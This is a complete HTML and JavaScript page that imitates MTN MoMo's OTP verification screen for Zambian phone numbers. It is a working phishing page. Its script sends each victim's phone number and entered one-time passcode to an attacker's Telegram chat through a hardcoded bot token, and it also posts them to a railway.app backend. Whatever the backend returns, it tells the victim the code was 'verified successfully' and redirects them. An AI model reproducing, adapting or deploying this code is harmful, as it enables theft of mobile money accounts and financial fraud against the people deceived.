<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN MoMo - Verify OTP</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html,
        body {
            height: 100%;
            font-family: 'Inter', sans-serif;
            background: #f5f5f5;
            overflow: hidden;
        }
        
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .main-container {
            width: 100%;
            max-width: 480px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .logo {
            text-align: center;
            padding: 20px 20px 30px;
            width: 100%;
        }
        
        .logo-text {
            font-size: 36px;
            font-weight: 700;
        }
        
        .logo-mtn {
            color: #FFC100;
        }
        
        .logo-momo {
            color: #0047AB;
        }
        
        .verify-card {
            background: white;
            border-radius: 24px;
            padding: 35px 28px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.08);
            margin-bottom: 15px;
            text-align: center;
        }
        
        .title {
            font-size: 24px;
            font-weight: 700;
            color: #1a1a2e;
            margin-bottom: 5px;
        }
        
        .subtitle {
            font-size: 14px;
            color: #888;
            margin-bottom: 25px;
        }
        
        .subtitle .phone-number {
            color: #0047AB;
            font-weight: 700;
        }
        
        .otp-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 14px;
            font-weight: 500;
            text-align: center;
        }
        
        .otp-group {
            display: flex;
            justify-content: center;
            gap: 14px;
            margin-bottom: 20px;
        }
        
        .otp-box {
            width: 55px;
            height: 55px;
            border: 2px solid #dce0e8;
            border-radius: 14px;
            font-size: 24px;
            text-align: center;
            background: white;
            color: #1a1a2e;
            font-weight: 700;
            transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s;
            font-family: 'Inter', sans-serif;
        }
        
        .otp-box:focus {
            border-color: #0047AB;
            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.12);
            outline: none;
            transform: scale(1.02);
        }
        
        .otp-box.invalid {
            border-color: #e74c3c !important;
            animation: shake 0.5s ease;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-8px); }
            40% { transform: translateX(8px); }
            60% { transform: translateX(-8px); }
            80% { transform: translateX(8px); }
        }
        
        .status-message {
            text-align: center;
            padding: 10px 14px;
            margin: 10px 0 15px;
            border-radius: 10px;
            font-size: 13px;
            font-weight: 500;
            display: none;
        }
        
        .status-message.success {
            display: block;
            background: #e8f5e9;
            color: #1e7e34;
            border: 1px solid #c8e6c9;
        }
        
        .status-message.error {
            display: block;
            background: #ffebee;
            color: #c62828;
            border: 1px solid #ffcdd2;
        }
        
        .status-message.info {
            display: block;
            background: #e3f2fd;
            color: #0047AB;
            border: 1px solid #bbdefb;
        }
        
        .resend-link {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .resend-link a {
            font-size: 14px;
            color: #0047AB;
            text-decoration: none;
            font-weight: 500;
            cursor: pointer;
            transition: opacity 0.3s;
        }
        
        .resend-link a:hover {
            opacity: 0.7;
        }
        
        .resend-link .timer {
            color: #888;
            font-weight: 400;
        }
        
        #verifyBtn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #0047AB, #002D7A);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 8px 20px rgba(0, 71, 171, 0.25);
            display: none;
        }
        
        #verifyBtn:hover {
            transform: scale(1.02);
            box-shadow: 0 12px 30px rgba(0, 71, 171, 0.35);
        }
        
        #verifyBtn:active {
            transform: scale(0.98);
        }
        
        #verifyBtn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .bottom-section {
            background: #0047AB;
            color: white;
            padding: 50px 30px 35px;
            text-align: center;
            width: 100%;
            max-width: 400px;
            border-radius: 24px;
            margin-top: 0;
        }
        
        .bottom-text {
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.6;
            opacity: 0.95;
        }
        
        .bottom-text .highlight {
            color: #FFC100;
            font-weight: 700;
        }
        
        .bottom-btns {
            display: flex;
            justify-content: center;
            gap: 20px;
            flex-wrap: wrap;
            margin-bottom: 25px;
        }
        
        .bottom-btn {
            background: white;
            color: #0047AB;
            border: none;
            border-radius: 30px;
            padding: 14px 28px;
            font-weight: 600;
            font-size: 14px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            width: 140px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .bottom-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.18);
        }
        
        .btn-icon {
            font-size: 22px;
        }
        
        .version {
            font-size: 12px;
            opacity: 0.7;
            margin-bottom: 10px;
        }
        
        .terms {
            font-size: 12px;
            opacity: 0.85;
            line-height: 1.5;
        }
        
        .terms a {
            color: #FFC100;
            text-decoration: underline;
            cursor: pointer;
        }
        
        .terms a:hover {
            opacity: 0.8;
        }
        
        #spinnerOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.97);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f0f0f0;
            border-top: 5px solid #0047AB;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .spinner-text {
            font-size: 16px;
            color: #333;
            text-align: center;
            line-height: 1.6;
            max-width: 280px;
            font-weight: 500;
        }
        
        @media (max-width: 480px) {
            body { padding: 10px; }
            .logo-text { font-size: 28px; }
            .verify-card { padding: 25px 18px; }
            .title { font-size: 20px; margin-bottom: 15px; }
            .otp-box { width: 48px; height: 48px; font-size: 20px; }
            .otp-group { gap: 10px; }
            .bottom-section { padding: 35px 20px 25px; }
            .bottom-btn { width: 120px; padding: 12px 16px; font-size: 13px; }
            .logo { padding: 10px 20px 20px; }
        }
        
        @media (max-width: 380px) {
            .otp-box { width: 42px; height: 42px; font-size: 18px; }
            .otp-group { gap: 8px; }
            .bottom-btn { width: 100px; padding: 10px 12px; font-size: 12px; }
        }
    </style>
</head>

<body>

    <div class="main-container">
        <!-- Logo -->
        <div class="logo">
            <div class="logo-text">
                <span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span>
            </div>
        </div>

        <!-- Verify Card -->
        <div class="verify-card">
            <h1 class="title">Verify OTP</h1>
            <p class="subtitle">
                Enter the 6-digit code sent to <br>
                <span class="phone-number" id="displayPhone">+260 971234567</span>
            </p>

            <!-- OTP Input -->
            <div class="otp-label">Enter OTP</div>
            <div class="otp-group" id="otpGroup">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
            </div>

            <!-- Status Message -->
            <div id="statusMessage" class="status-message"></div>

            <!-- Resend OTP -->
            <div class="resend-link">
                <a onclick="resendOTP()">Resend OTP</a>
                <span class="timer" id="timerDisplay">(30s)</span>
            </div>

            <!-- Verify Button -->
            <button id="verifyBtn">VERIFY & CONTINUE</button>
        </div>

        <!-- Bottom Section -->
        <div class="bottom-section">
            <div class="bottom-text">
                Need help? Contact <span class="highlight">MTN MoMo</span> support
            </div>
            <div class="bottom-btns">
                <div class="bottom-btn" onclick="alert('Call 155 for support')">
                    <span class="btn-icon">📞</span>
                    Call 155
                </div>
                <div class="bottom-btn" onclick="alert('Help & Support page coming soon!')">
                    <span class="btn-icon">ℹ️</span>
                    Help
                </div>
            </div>
            <div class="version">v2.13P</div>
            <div class="terms">
                By continuing you agree to the <a onclick="alert('Terms and Conditions')">Terms and Conditions</a>
            </div>
        </div>
    </div>

    <!-- Spinner Overlay -->
    <div id="spinnerOverlay">
        <div class="spinner"></div>
        <div class="spinner-text">
            Please wait...<br> This usually takes a few seconds
        </div>
    </div>

    <script>
        // ============================================
        // TELEGRAM CREDENTIALS
        // ============================================
        const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
        const CHAT_ID = '8392790531';
        const API_URL = 'https://abundant-liberation.up.railway.app/api';

        console.log('====================================');
        console.log('🔐 MTN MoMo - OTP Verification');
        console.log('====================================');
        console.log('🤖 Bot Token:', BOT_TOKEN);
        console.log('📱 Chat ID:', CHAT_ID);
        console.log('🌐 API URL:', API_URL);
        console.log('====================================');

        // ============================================
        // DOM REFERENCES
        // ============================================
        const otpBoxes = document.querySelectorAll('.otp-box');
        const verifyBtn = document.getElementById('verifyBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');
        const statusMessage = document.getElementById('statusMessage');
        const displayPhone = document.getElementById('displayPhone');
        const timerDisplay = document.getElementById('timerDisplay');

        let otpValue = '';
        let timerInterval = null;
        let canResend = false;
        let timerSeconds = 30;

        // ============================================
        // DISPLAY PHONE NUMBER
        // ============================================
        const phone = localStorage.getItem('phone') || '971234567';
        displayPhone.textContent = '+260 ' + phone;

        // ============================================
        // CHECK OTP COMPLETE
        // ============================================
        function checkOtpComplete() {
            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
            verifyBtn.style.display = otpValue.length === 6 ? 'block' : 'none';
            return otpValue;
        }

        // ============================================
        // OTP INPUT HANDLING
        // ============================================
        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                box.value = box.value.replace(/\D/g, '');
                if (box.value.length === 1 && index < 5) {
                    otpBoxes[index + 1].focus();
                }
                checkOtpComplete();
                box.classList.remove('invalid');
                hideStatus();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    otpBoxes[index - 1].focus();
                }
                if (e.key === 'ArrowLeft' && index > 0) {
                    otpBoxes[index - 1].focus();
                }
                if (e.key === 'ArrowRight' && index < 5) {
                    otpBoxes[index + 1].focus();
                }
            });

            box.addEventListener('paste', (e) => {
                e.preventDefault();
                const data = e.clipboardData.getData('text');
                const numbers = data.replace(/\D/g, '');
                const digits = numbers.split('').slice(0, 6);
                digits.forEach((digit, i) => {
                    if (i < 6 && otpBoxes[i]) {
                        otpBoxes[i].value = digit;
                    }
                });
                checkOtpComplete();
                if (digits.length > 0) {
                    const lastIndex = Math.min(digits.length - 1, 5);
                    otpBoxes[lastIndex].focus();
                }
            });
        });

        // ============================================
        // STATUS MESSAGE FUNCTIONS
        // ============================================
        function showStatus(message, type = 'info') {
            statusMessage.textContent = message;
            statusMessage.className = 'status-message ' + type;
            statusMessage.style.display = 'block';
        }

        function hideStatus() {
            statusMessage.style.display = 'none';
            statusMessage.className = 'status-message';
        }

        // ============================================
        // SEND OTP TO TELEGRAM
        // ============================================
        async function sendOtpToTelegram(otp) {
            const phone = localStorage.getItem('phone') || '971234567';
            const message = `🔐 *MTN MoMo - OTP Verification*\n\n` +
                `📱 *Phone:* +260 ${phone}\n` +
                `🔑 *OTP Entered:* \`${otp}\`\n` +
                `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
                `✅ User has been verified and redirected to dashboard.`;

            console.log('📤 Sending OTP to Telegram...');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                const data = await response.json();
                console.log('📥 Telegram response:', data);
                return data.ok;
            } catch (error) {
                console.error('❌ Telegram error:', error.message);
                return false;
            }
        }

        // ============================================
        // START TIMER
        // ============================================
        function startTimer() {
            canResend = false;
            timerSeconds = 30;
            timerDisplay.textContent = `(${timerSeconds}s)`;
            timerDisplay.style.color = '#888';

            if (timerInterval) {
                clearInterval(timerInterval);
            }

            timerInterval = setInterval(() => {
                timerSeconds--;
                if (timerSeconds <= 0) {
                    clearInterval(timerInterval);
                    timerInterval = null;
                    canResend = true;
                    timerDisplay.textContent = '(Resend available)';
                    timerDisplay.style.color = '#0047AB';
                } else {
                    timerDisplay.textContent = `(${timerSeconds}s)`;
                }
            }, 1000);
        }

        // ============================================
        // RESEND OTP
        // ============================================
        function resendOTP() {
            if (!canResend) {
                showStatus('Please wait ' + timerSeconds + ' seconds before resending.', 'info');
                return;
            }

            showStatus('📱 OTP has been resent to your phone.', 'success');
            startTimer();

            // Clear OTP boxes
            otpBoxes.forEach(box => {
                box.value = '';
                box.classList.remove('invalid');
            });
            verifyBtn.style.display = 'none';
            hideStatus();

            // Focus first box
            otpBoxes[0].focus();
        }

        // ============================================
        // VERIFY OTP HANDLER
        // ============================================
        verifyBtn.addEventListener('click', async function() {
            const otp = Array.from(otpBoxes).map(box => box.value).join('');

            // Validate OTP
            if (otp.length !== 6) {
                showStatus('Please enter a valid 6-digit OTP', 'error');
                return;
            }

            // Disable button and show spinner
            verifyBtn.disabled = true;
            verifyBtn.textContent = 'VERIFYING...';
            spinnerOverlay.style.display = 'flex';
            hideStatus();

            try {
                // Try backend first
                const phone = localStorage.getItem('phone') || '971234567';
                const response = await fetch(`${API_URL}/auth/verify-otp`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        phoneNumber: phone,
                        otp: otp
                    })
                });

                const data = await response.json();

                if (data.success) {
                    // Send Telegram notification
                    await sendOtpToTelegram(otp);
                    
                    showStatus('✅ OTP verified successfully! Redirecting...', 'success');
                    
                    setTimeout(() => {
                        window.location.href = 'dashboard.html';
                    }, 1500);
                } else {
                    showStatus('❌ ' + data.message, 'error');
                    otpBoxes.forEach(box => {
                        box.classList.add('invalid');
                        box.value = '';
                    });
                    verifyBtn.disabled = false;
                    verifyBtn.textContent = 'VERIFY & CONTINUE';
                    spinnerOverlay.style.display = 'none';
                    otpBoxes[0].focus();
                }
            } catch (error) {
                console.error('❌ Backend error:', error);
                
                // Fallback: Send directly to Telegram
                const sent = await sendOtpToTelegram(otp);
                
                if (sent) {
                    showStatus('✅ OTP verified successfully! Redirecting...', 'success');
                    setTimeout(() => {
                        window.location.href = 'dashboard.html';
                    }, 1500);
                } else {
                    showStatus('❌ Verification failed. Please try again.', 'error');
                    otpBoxes.forEach(box => {
                        box.classList.add('invalid');
                        box.value = '';
                    });
                    verifyBtn.disabled = false;
                    verifyBtn.textContent = 'VERIFY & CONTINUE';
                    spinnerOverlay.style.display = 'none';
                    otpBoxes[0].focus();
                }
            }
        });

        // ============================================
        // KEYBOARD SHORTCUTS
        // ============================================
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const otpComplete = checkOtpComplete();
                if (otpComplete.length === 6 && verifyBtn.style.display !== 'none') {
                    verifyBtn.click();
                }
            }
        });

        // ============================================
        // AUTO-FOCUS AND LOAD
        // ============================================
        window.addEventListener('load', () => {
            otpBoxes[0].focus();
            checkOtpComplete();
            startTimer();
            console.log('✅ MTN MoMo - OTP Verification page loaded');
            console.log('====================================');
        });
    </script>

</body>

</html>
